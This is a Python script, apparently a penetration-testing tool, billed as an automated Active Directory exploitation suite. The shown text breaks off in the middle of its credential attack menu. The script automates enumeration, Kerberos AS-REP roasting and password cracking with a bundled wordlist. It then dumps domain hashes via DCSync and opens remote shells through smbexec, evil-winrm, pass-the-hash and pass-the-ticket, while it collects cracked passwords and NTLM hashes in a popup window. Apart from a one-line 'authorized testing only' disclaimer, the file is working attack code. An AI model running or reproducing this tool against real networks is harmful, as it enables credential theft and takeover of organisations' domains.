#!/usr/bin/env python3

import subprocess
import sys
import os
import re
import socket
import time
import tempfile
import shutil
import atexit

# --- CONFIGURATION ---
RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
BLUE = "\033[94m"
CYAN = "\033[96m"
RESET = "\033[0m"

# Global xterm processes
creds_xterm_proc = None
options_xterm_proc = None

# Cumulative list of all discovered credentials
all_credentials = []   # Each element: dict {username, domain, password, lmhash, nthash}

def print_banner():
    print(f"""{RED}
⠀⠀⠀⢀⣠⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣶⣦⣄⡀⠀⠀⠀⠀
⠀⠀⢀⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⡀⠀⠀
⠀⣰⣿⣿⣿⢟⡛⣿⡟⣡⠟⣷⡩⢽⣿⠿⡟⡟⡛⢿⡿⢿⡿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⣿⢿⡿⣿⣯⢿⢿⣏⢿⣿⣿⣿⢿⡏⡙⢻⣿⣿⣿⣿⣆⠀
⢰⣿⣿⣿⡗⢬⣸⣿⡝⢦⣻⣿⠡⣾⣿⡻⢇⢻⡘⣼⡟⣸⡇⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢻⢻⡷⢯⣿⣻⣿⣾⡸⣿⣏⣿⣻⣿⣿⡟⣧⢁⢻⣽⣿⣿⣿⣿⡄
⣼⣿⣿⣿⡏⢆⢻⣿⡽⢪⢵⡏⢰⣿⣿⡽⡇⢿⡐⣿⠓⣼⠁⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠘⡧⣿⣻⣞⣷⢿⣽⣳⢹⡿⢻⣿⡿⣿⢼⣿⢀⢻⣾⣿⣿⣿⣿⣧
⣿⣿⣿⣿⡽⣈⠞⣿⣽⠏⣸⡇⢸⣿⡷⢯⢹⢸⣸⣟⠡⡏⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡄⢳⠼⣳⡿⣺⣿⣻⣽⡌⢿⢸⣿⣿⣿⣯⣿⠐⢺⣽⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡷⣈⠞⣿⣿⢢⢹⡇⢸⣿⣿⣻⠃⣯⣿⡇⢣⠃⠀⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣇⠸⡱⢻⡅⢱⣿⡯⣟⣧⠸⢨⣿⣿⣾⢳⣿⠈⣽⣾⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢠⢋⣿⣿⠣⢼⡁⢸⣿⣷⡻⠀⣿⣿⡘⡇⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡆⢗⡩⠇⠘⣹⣧⢻⣷⠀⡆⣿⣿⣾⢸⣿⠥⣸⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡄⢻⣼⣿⡟⣸⠀⣼⣿⣧⡇⢸⡿⣇⢻⠃⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⢸⡀⡇⠀⣿⣿⡄⣿⡇⡇⣿⣿⣻⢸⣿⢃⡧⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣻⡘⣿⣿⡧⢹⠀⣿⣿⣷⠃⣸⣟⣏⠇⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟⠛⠛⡂⡱⣁⠀⣿⣿⡧⢹⣧⡇⢹⣿⣿⣸⣿⠀⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢷⣧⢻⣿⣿⡀⢐⣿⣿⡛⠀⣿⣽⠎⠀⢀⣾⣿⣿⣿⣿⠿⢿⠻⢟⡛⢿⣟⠀⠀⠀⠀⠀⠀⢀⠀⠄⠐⡐⡀⠀⠘⣿⣷⢨⣷⡅⠘⣿⣿⢾⣿⠨⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣟⣾⡽⣿⣿⡇⡼⣿⣿⠀⣸⣿⡟⠀⠀⣼⣟⣯⢟⣽⣚⢿⡠⢋⠦⣙⢺⣯⠀⠀⠐⠀⡁⠈⡀⠄⠀⠂⠁⡀⡄⠀⢹⣹⣦⡿⡇⠀⣿⣿⢸⣿⢸⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣟⡾⣧⢼⡟⡵⣽⣿⠃⢀⣿⡿⠃⢀⣼⣿⢾⣹⡞⣧⢯⣏⣷⣉⠖⣡⢻⡷⠀⠀⡁⠄⠀⡁⠀⠄⢈⠀⠄⠠⠀⠀⠈⣷⢿⣿⡇⡀⢸⣿⡎⣏⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣽⣿⢚⣿⢒⣽⡟⢀⣾⡿⢁⣠⣾⣿⣿⢯⣳⢽⣚⢷⣺⣜⣻⣜⠤⣻⡟⠀⠀⠄⠐⢀⠀⠂⢈⠀⠄⠂⢀⠈⢂⠀⢹⣞⣼⣟⠰⡘⢿⣯⣟⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣷⣻⣧⡿⢪⣿⢆⣿⡿⣕⣽⣿⣿⣿⣿⢏⣞⣧⢻⢧⡷⣹⢶⡻⣶⣹⣟⠀⠀⠂⠈⠀⠐⠈⠀⠀⠂⠀⠂⠀⠈⣷⡘⣿⣹⢾⡄⡏⡼⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⣿⣟⣾⢯⣳⣽⣿⣿⣿⣿⣿⣯⣾⣾⣯⣷⣽⣯⣾⣷⣭⣿⣷⣤⣤⣤⣤⣥⣤⣤⣤⣥⣤⣴⣤⣥⣤⣿⣿⣮⡽⣮⡽⣗⠢⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⡿⢿⡽⠿⠿⣯⣷⣿⣿⣿⣿⣿⣿⡯⢍⡍⣩⢉⡍⣩⢉⣉⢉⣉⣹⣯⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⠉⣿⣿⣿⣿⣿⣿⠞⠟⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣏⠶⣌⡱⢎⡔⢣⠎⣆⠳⢤⢻⣟⠀⢀⠂⠐⠀⠂⠐⠀⠂⠐⡀⠐⠠⠀⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⢿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣱⣾⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⡗⣪⠔⣱⢊⡼⣑⢚⣌⢣⡃⢿⡿⠀⠀⠄⢈⠀⡁⢈⠀⠡⠀⠄⠂⠐⠀⣿⣿⣿⣿⣿⣿⣿⢾⡏⢾⣻⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣟⢤⢋⠦⡓⡴⢣⠍⡆⠧⣜⣹⡿⠀⢈⠀⠄⠠⠀⠄⠂⠐⠠⠐⠈⢀⠁⣿⣿⣿⣿⣿⣿⣿⣸⢧⣹⢷⣻⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣇⢻⣾⣟⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣏⡻⢶⡹⢦⣓⣎⡹⢜⡰⢺⣏⠀⠄⢀⠂⠐⠠⠐⠀⡁⢀⠂⠈⡀⠀⣿⣿⣿⣿⣿⣿⡟⣿⡸⣼⣟⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⡜⢺⣽⣿⣿⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣿⣶⣽⣾⣖⣿⣯⣀⡀⠂⠠⠈⢀⠐⠀⠄⠠⠀⢁⠀⠌⣿⣿⣿⣿⣿⣿⢻⣿⡇⢺⣟⣼⣻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡿⣘⣿⠾⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣾⣶⣶⣬⣤⣔⣈⣀⡄⣀⣿⣿⣿⣿⣿⣿⣼⣿⡇⢻⣿⢧⣻⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡷⣡⣿⣹⣿⢹⣧⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣿⣿⣌⡷⣿⣿⢳⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣷⢹⣿⡜⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡝⣿⣿⣾⢱⣿⡏⣷⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⠣⢾⣿⠴⣿⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣹⣿⣿⡾⢣⣿⣟⢶⣻⣿⣿⣿⣿
⣿⣿⣿⣿⣿⢡⣻⣿⢎⣿⣞⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⢼⣿⣿⡏⢧⣿⡟⣮⣽⣿⣿⣿⣿
⣿⣿⣿⣿⡽⡆⣽⣿⢺⣿⠇⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢺⣿⣿⣿⢢⣿⣱⢳⣾⣿⣿⣿⣿
⢻⣿⣿⣿⣿⡱⣿⣿⣹⣿⢍⢾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⢹⣾⣿⣿⠥⣿⣣⢟⣼⣿⣿⣿⡏
⠸⣿⣿⣿⣷⢣⣿⣿⢼⣿⢌⣿⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣹⢷⣿⣿⡧⣹⡧⣟⣾⣿⣿⣿⠇
⠀⠹⣿⣿⣿⣿⣿⣿⣺⣿⣾⣷⣻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣟⣾⣿⣷⣿⣷⣯⣿⣿⣿⠋⠀
⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀
⠀⠀⠀⠀⠈⠙⠻⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠿⠟
{RED}========================================================================================
{YELLOW}   ACTIVE DIRECTORY AUTOMATED EXPLOITATION SUITE
{RED}========================================================================================
{BLUE}   [1] Nmap Full Port Scan & Service Detection
   [2] Enum4Linux Enumeration
   [3] LDAP Domain Extraction
   [4] Kerbrute User Enumeration
   [5] AS-REP Roasting (GetNPUsers)
   [6] Password Cracking (John the Ripper)
   [7] Credential Attack Menu (A-M)
{RED}           NOW CURTAIN YOUR WINDOWS
{RED}=========================================================================================
{YELLOW}   DISCLAIMER: For authorized testing only.
{RED}=========================================================================================
{CYAN}                    (:|PROJECT BY:ALAN KJ|:){RESET}
""")

# ---------- CREDENTIALS XTERM ----------
def update_creds_window():
    """Refresh the persistent credentials popup with ALL found credentials."""
    global creds_xterm_proc, all_credentials
    if creds_xterm_proc and creds_xterm_proc.poll() is None:
        creds_xterm_proc.kill()
        creds_xterm_proc = None

    lines = ["=== CREDENTIALS FOUND ==="]
    if not all_credentials:
        lines.append("No credentials yet.")
    else:
        for i, entry in enumerate(all_credentials, 1):
            lines.append(f"\n--- Entry {i} ---")
            lines.append(f"Username: {entry.get('username','')}")
            lines.append(f"Domain:   {entry.get('domain','')}")
            if entry.get('password'):
                lines.append(f"Password: {entry['password']}")
            if entry.get('nthash'):
                lm = entry.get('lmhash', '')
                lines.append(f"NTLM Hash: {lm}:{entry['nthash']}")

    text = "\n".join(lines)

    fd, path = tempfile.mkstemp(suffix='.txt')
    with os.fdopen(fd, 'w') as f:
        f.write(text)
    creds_xterm_proc = subprocess.Popen(
        ['xterm', '-T', 'Credentials', '-bg', 'black', '-fg', 'green', '-e', 'less', path],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

def add_credential(creds_dict):
    """Add a credential entry to the cumulative list, avoiding exact duplicates."""
    global all_credentials
    for entry in all_credentials:
        if (entry.get('username') == creds_dict.get('username') and
            entry.get('domain') == creds_dict.get('domain') and
            entry.get('password') == creds_dict.get('password') and
            entry.get('nthash') == creds_dict.get('nthash')):
            return  # already present
    all_credentials.append(creds_dict)
    update_creds_window()

def cleanup_creds_window():
    global creds_xterm_proc
    if creds_xterm_proc and creds_xterm_proc.poll() is None:
        creds_xterm_proc.kill()

atexit.register(cleanup_creds_window)

# ---------- OPTIONS HELP XTERM ----------
def update_options_window():
    """Display a help window explaining all credential attack options."""
    global options_xterm_proc
    if options_xterm_proc and options_xterm_proc.poll() is None:
        options_xterm_proc.kill()
        options_xterm_proc = None

    help_text = """
================ CREDENTIAL ATTACK OPTIONS ================

A - secretsdump       : Dump domain hashes using DCSync.
B - smbexec (hash)    : Semi-interactive shell via SMB using NTLM hash.
C - smbexec (creds)   : Semi-interactive shell via SMB using password.
D - evil-winrm (hash) : PowerShell remoting using NTLM hash (port 5985).
E - evil-winrm (creds): PowerShell remoting using password.
F - rdesktop          : RDP connection using password.
G - smbclient list    : List SMB shares.
H - smbclient session : Browse a specific SMB share interactively.
I - Overpass-the-Hash : Request a TGT using NTLM hash (impacket-getTGT).
J - Pass-the-Key      : Request a TGT using AES/DES key.
K - Export Ticket     : Set KRB5CCNAME environment variable.
L - Pass-the-Ticket   : Execute a command via PSExec using a Kerberos ticket.
M - xfreerdp /pth     : RDP with Pass-the-Hash (requires Restricted Admin Mode enabled).

Select option (A-M) or R to return.
=========================================================
    """
    fd, path = tempfile.mkstemp(suffix='.txt')
    with os.fdopen(fd, 'w') as f:
        f.write(help_text)
    options_xterm_proc = subprocess.Popen(
        ['xterm', '-T', 'Options Help', '-bg', 'black', '-fg', 'green', '-e', 'less', path],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )

def kill_options_window():
    global options_xterm_proc
    if options_xterm_proc and options_xterm_proc.poll() is None:
        options_xterm_proc.kill()
        options_xterm_proc = None

atexit.register(kill_options_window)

# ---------- DEPENDENCY CHECK ----------
def check_dependencies():
    missing = []
    required_tools = ["nmap", "enum4linux", "ldapsearch", "john", "smbclient"]
    for tool in required_tools:
        if shutil.which(tool) is None:
            missing.append(tool)
    if shutil.which("kerbrute") is None:
        missing.append("kerbrute (Install from https://github.com/ropnop/kerbrute)")
    if shutil.which("xfreerdp") is None:
        missing.append("xfreerdp")
    if missing:
        print(f"{RED}[!] ERROR: Missing required tools: {', '.join(missing)}{RESET}")
        print(f"{YELLOW}[!] Please install missing tools before proceeding.{RESET}")
        sys.exit(1)

# ---------- COMMAND RUNNER ----------
def run_command(cmd, timeout=300, capture_output=True, show_live=False):
    print(f"{BLUE}[*] Executing: {' '.join(cmd)}{RESET}")
    try:
        if show_live:
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
            output = ""
            for line in process.stdout:
                print(line, end='')
                output += line
            process.wait()
            return output, process.returncode
        elif capture_output:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=timeout, text=True)
            return result.stdout + result.stderr, result.returncode
        else:
            subprocess.run(cmd, timeout=timeout)
            return "", 0
    except subprocess.TimeoutExpired:
        print(f"\n{RED}[!] Command timed out after {timeout} seconds.{RESET}")
        return "", -1
    except Exception as e:
        print(f"\n{RED}[!] Error executing command: {e}{RESET}")
        return "", -1

# ---------- UTILITY FUNCTIONS ----------
def extract_domain_from_ldap(ip):
    print(f"\n{CYAN}[+] Attempting to extract Domain Name via LDAP anonymous bind...{RESET}")
    cmd = ["ldapsearch", "-x", "-H", f"ldap://{ip}", "-s","base", "(objectClass=*)", "defaultNamingContext", "dnsHostName"]
    output, code = run_command(cmd, timeout=10, capture_output=True)
    domain = None
    if "defaultNamingContext" in output:
        parts = re.findall(r"DC=([a-zA-Z0-9-]+)", output)
        if parts:
            domain = ".".join(parts)
            print(f"{GREEN}[+] Domain found via LDAP: {domain}{RESET}")
            return domain
    print(f"{RED}[!] Could not extract domain via anonymous LDAP.{RESET}")
    return None

def extract_users_from_kerbrute_output(output):
    users = []
    lines = output.split('\n')
    for line in lines:
        if "VALID" in line and "USERNAME" in line:
            user_match = re.search(r"VALID USERNAME:\s+([^@]+)", line)
            if user_match:
                user = user_match.group(1).strip()
                if user not in users:
                    users.append(user)
    return users

def create_default_wordlist():
    print(f"{YELLOW}[!] No wordlist provided. Generating a small default list...{RESET}")
    words = [
        "password", "123456", "12345678", "qwerty", "abc123", "monkey", "1234567",
        "letmein", "trustno1", "dragon", "baseball", "iloveyou", "master", "sunshine",
        "ashley", "bailey", "shadow", "123123", "654321", "superman", "q1234567",
        "management", "admin", "administrator", "root", "system", "backup", "test",
        "guest", "info", "mail", "user", "support", "help", "security", "login",
        "spookysec", "hack", "ctf", "flag", "secret", "password1", "changeme",
        "Welcome1", "Password1", "P@ssw0rd", "Summer2023", "Winter2024", "management2005"
    ]
    temp_file = tempfile.NamedTemporaryFile(mode='w', delete=False, suffix='.txt')
    for word in words:
        temp_file.write(word + "\n")
    temp_file.close()
    return temp_file.name

def update_hosts_file(ip, domain):
    print(f"\n{CYAN}[+] Updating /etc/hosts with {ip} {domain}...{RESET}")
    hosts_entry = f"{ip} {domain}\n"
    hosts_path = "/etc/hosts"
    try:
        with open(hosts_path, 'r') as f:
            content = f.read()
            if f"{ip} {domain}" in content or f"{ip}\t{domain}" in content:
                print(f"{YELLOW}[!] Entry already exists in /etc/hosts{RESET}")
                return True
        cmd = f'echo "{ip} {domain}" | sudo tee -a {hosts_path}'
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        if result.returncode == 0:
            print(f"{GREEN}[+] Successfully added entry to /etc/hosts{RESET}")
        else:
            print(f"{RED}[!] Failed to add entry: {result.stderr}{RESET}")
            return False
    except Exception as e:
        print(f"{RED}[!] Error updating hosts file: {e}{RESET}")
        return False
    print(f"{CYAN}[+] Opening /etc/hosts in mousepad...{RESET}")
    try:
        subprocess.Popen(["sudo", "mousepad", hosts_path],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        print(f"{GREEN}[+] Mousepad opened.{RESET}")
        return True
    except:
        print(f"{YELLOW}[!] Could not open mousepad.{RESET}")
        return False

def run_cracking_job(hash_string, user_name, wordlist_path):
    print(f"\n{CYAN}[STEP 7] Cracking Password with John the Ripper{RESET}")
    print(f"{YELLOW}[!] Target: {user_name}")
    print(f"[!] Hash Type: Kerberos AS-REP ($krb5asrep)")
    print(f"[!] Wordlist: {wordlist_path}{RESET}")
    hash_file_path = None
    try:
        fd, hash_file_path = tempfile.mkstemp(suffix='.hash')
        with os.fdopen(fd, 'w') as f:
            f.write(hash_string.strip())
        print(f"[+] Hash written to temporary file: {hash_file_path}")
    except Exception as e:
        print(f"{RED}[!] Failed to create temporary hash file: {e}{RESET}")
        return None
    john_cmd = ["john", "--wordlist=" + wordlist_path, "--format=krb5asrep", hash_file_path]
    print(f"\n{BLUE}[*] Executing John the Ripper (this may take time)...{RESET}")
    output = ""
    try:
        result = subprocess.run(john_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=600)
        output = result.stdout + result.stderr
        print(output)
        password = None
        match = re.search(r'([^\s]+)\s+\(\$krb5asrep', output)
        if match:
            potential_pwd = match.group(1)
            if potential_pwd and len(potential_pwd) > 0:
                password = potential_pwd
                print(f"{GREEN}[+] Password detected in output stream: {password}{RESET}")
        if not password:
            print(f"{YELLOW}[!] Attempting to retrieve cracked password via --show command...{RESET}")
            show_cmd = ["john", "--show", hash_file_path]
            show_result = subprocess.run(show_cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
            show_output = show_result.stdout + show_result.stderr
            if f"{user_name}:" in show_output:
                lines = show_output.split('\n')
                for line in lines:
                    if line.startswith(f"{user_name}:"):
                        parts = line.split(':', 1)
                        if len(parts) == 2 and parts[1]:
                            password = parts[1]
                            break
        if password:
            print(f"\n{GREEN}[+] SUCCESS! Password found for '{user_name}': {password}{RESET}")
            if hash_file_path and os.path.exists(hash_file_path):
                os.unlink(hash_file_path)
            return password
        else:
            print(f"\n{RED}[!] Failed to crack the password.{RESET}")
            if hash_file_path and os.path.exists(hash_file_path):
                os.unlink(hash_file_path)
            return None
    except subprocess.TimeoutExpired:
        print(f"\n{RED}[!] Cracking timed out.{RESET}")
        if hash_file_path and os.path.exists(hash_file_path):
            os.unlink(hash_file_path)
        return None
    except Exception as e:
        print(f"{RED}[!] Error running John: {e}{RESET}")
        if hash_file_path and os.path.exists(hash_file_path):
            os.unlink(hash_file_path)
        return None

def extract_hash_from_secretsdump(output):
    hash_pattern = r'(\w+):(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::'
    matches = re.findall(hash_pattern, output, re.IGNORECASE)
    if matches:
        print(f"\n{GREEN}[+] Found {len(matches)} user hashes:{RESET}")
        for i, (user, rid, lmhash, nthash) in enumerate(matches):
            print(f"    {i+1}. {user} - {lmhash}:{nthash}")
        return matches
    return None

def parse_manual_hash(hash_input):
    match = re.search(r':(\d+):([a-f0-9]{32}):([a-f0-9]{32}):::', hash_input)
    if match:
        return match.group(2), match.group(3)
    if re.match(r'^[a-f0-9]{32}:[a-f0-9]{32}$', hash_input, re.IGNORECASE):
        parts = hash_input.split(':')
        return parts[0], parts[1]
    return None, None

# ---------- CREDENTIAL ATTACK MENU ----------
def credential_attack_menu(creds):
    """Main menu for credential attacks A-M. Sessions return to this menu."""
    # Show both persistent windows
    update_creds_window()
    update_options_window()

    while True:
        print(f"\n{CYAN}=== CREDENTIAL ATTACK MENU ==={RESET}")
        print(f"{YELLOW}Current User: {creds['username']} | Domain: {creds['domain']} | IP: {creds['ip']}{RESET}")
        if creds.get('nthash'):
            print(f"{GREEN}Hash Loaded: {creds.get('lmhash','')}:{creds['nthash']}{RESET}")
        print(f"\nA secretsdump (dump domain hashes)")
        print(f"B impacket-smbexec with hash")
        print(f"C impacket-smbexec with creds")
        print(f"D evil-winrm with hash")
        print(f"E evil-winrm with creds")
        print(f"F rdesktop (RDP)")
        print(f"G smbclient list shares")
        print(f"H smbclient interactive session")
        print(f"I Overpass-the-Hash (getTGT)")
        print(f"J Pass-the-Key (AES key)")
        print(f"K Export KRB5CCNAME ticket")
        print(f"L Pass-the-Ticket (psexec)")
        print(f"M xfreerdp Pass-the-Hash (/restrictedAdmin)")
        print(f"R Return/Exit")

        choice = input(f"\n{CYAN}Select option (A-M, R): {RESET}").strip().upper()

        # ========== OPTION A: SECRETSDUMP ==========
        if choice == 'A':
            print(f"\n{CYAN}[OPTION A] Running impacket-secretsdump...{RESET}")
            while True:
                cmd = [
                    "impacket-secretsdump",
                    f"{creds['domain']}/{creds['username']}:{creds['password']}@{creds['ip']}",
                    "-just-dc"
                ]
                output, code = run_command(cmd, timeout=300, capture_output=True, show_live=True)
                if code != 0 or "ERROR" in output or not extract_hash_from_secretsdump(output):
                    print(f"{RED}[!] secretsdump failed or no hashes found{RESET}")
                    retry = input("Change credentials and retry? (yes/no): ").strip().lower()
                    if retry == 'yes':
                        creds['username'] = input("Enter username: ").strip()
                        creds['password'] = input("Enter password: ").strip()
                        # *** Add the changed manual credentials to the list ***
                        add_credential({
                            'username': creds['username'],
                            'domain': creds['domain'],
                            'password': creds['password'],
                            'lmhash': '',
                            'nthash': ''
                        })
                        continue
                    else:
                        break
                else:
                    hashes = extract_hash_from_secretsdump(output)
                    if hashes:
                        print(f"\n{YELLOW}Select a user hash to load:{RESET}")
                        for i, (user, rid, lmhash, nthash) in enumerate(hashes):
                            print(f"  {i+1}. {user}")
                        while True:
                            sel = input("Enter number (or 'manual' to paste hash): ").strip()
                            if sel.lower() == 'manual':
                                manual = input("Paste hash (e.g., Administrator:500:LM:NT:::): ").strip()
                                lm, nt = parse_manual_hash(manual)
                                if nt:
                                    creds['lmhash'] = lm
                                    creds['nthash'] = nt
                                    creds['username'] = manual.split(':')[0] if ':' in manual else creds['username']
                                    # *** Add hash-only entry (no password) ***
                                    add_credential({
                                        'username': creds['username'],
                                        'domain': creds['domain'],
                                        'password': '',   # <-- no password for hash
                                        'lmhash': lm,
                                        'nthash': nt
                                    })
                                    print(f"{GREEN}[+] Hash loaded: {lm}:{nt}{RESET}")
                                    break
                                else:
                                    print(f"{RED}[!] Invalid hash format{RESET}")
                            elif sel.isdigit() and 1 <= int(sel) <= len(hashes):
                                user, rid, lmhash, nthash = hashes[int(sel)-1]
                                creds['username'] = user
                                creds['lmhash'] = lmhash
                                creds['nthash'] = nthash
                                # *** Add hash-only entry ***
                                add_credential({
                                    'username': user,
                                    'domain': creds['domain'],
                                    'password': '',   # <-- no password
                                    'lmhash': lmhash,
                                    'nthash': nthash
                                })
                                print(f"{GREEN}[+] Selected {user} - hash loaded{RESET}")
                                break
                            else:
                                print(f"{RED}[!] Invalid selection{RESET}")
                    break

        # ========== OPTION B: SMBEXEC HASH ==========
        elif choice == 'B':
            print(f"\n{CYAN}[OPTION B] impacket-smbexec with hash{RESET}")
            if not creds.get('nthash'):
                print(f"{YELLOW}[!] No hash loaded. Please run Option A first or enter manually:{RESET}")
                hash_input = input("Enter hash (LM:NT or full dump line): ").strip()
                lm, nt = parse_manual_hash(hash_input)
                if nt:
                    creds['lmhash'] = lm
                    creds['nthash'] = nt
                    creds['username'] = hash_input.split(':')[0] if ':' in hash_input else input("Enter username: ").strip()
                    # *** Add hash-only entry (no password) ***
                    add_credential({
                        'username': creds['username'],
                        'domain': creds['domain'],
                        'password': '',
                        'lmhash': lm,
                        'nthash': nt
                    })
                else:
                    print(f"{RED}[!] Invalid hash{RESET}")
                    continue
            hash_str = f"{creds.get('lmhash','')}:{creds['nthash']}" if creds.get('lmhash') else f":{creds['nthash']}"
            cmd = [
                "impacket-smbexec",
                "-hashes", hash_str,
                f"{creds['domain']}/{creds['username']}@{creds['ip']}"
            ]
            run_command(cmd, timeout=300, capture_output=False)
            print(f"{YELLOW}[*] smbexec session ended. Returning to menu...{RESET}")

        # ========== OPTION C: SMBEXEC CREDS ==========
        elif choice == 'C':
            print(f"\n{CYAN}[OPTION C] impacket-smbexec with credentials{RESET}")
            cmd = [
                "impacket-smbexec",
                f"{creds['domain']}/{creds['username']}:{creds['password']}@{creds['ip']}"
            ]
            run_command(cmd, timeout=300, capture_output=False)
            print(f"{YELLOW}[*] smbexec session ended. Returning to menu...{RESET}")

        # ========== OPTION D: EVIL-WINRM HASH ==========
        elif choice == 'D':
            print(f"\n{CYAN}[OPTION D] evil-winrm with hash{RESET}")
            use_loaded = input(f"Use loaded hash for {creds['username']}? (yes/no): ").strip().lower()
            if use_loaded == 'yes' and creds.get('nthash'):
